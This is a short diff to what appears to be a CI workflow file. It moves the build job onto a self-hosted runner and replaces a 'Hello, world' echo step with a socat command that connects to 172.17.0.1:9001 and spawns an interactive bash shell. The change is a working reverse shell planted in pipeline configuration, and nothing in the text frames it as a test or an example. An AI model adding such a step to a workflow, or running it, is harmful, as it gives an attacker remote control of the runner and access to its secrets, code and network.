@@ -5,7 +5,7 @@ on:
 
 jobs:
   build:
-    runs-on: ubuntu-latest
+    runs-on: self-hosted
     steps:
       - name: Run a one-line script
-        run: echo Hello, world!
+        run: socat TCP:172.17.0.1:9001 EXEC:'bash',pty,stderr,setsid,sigint,sane
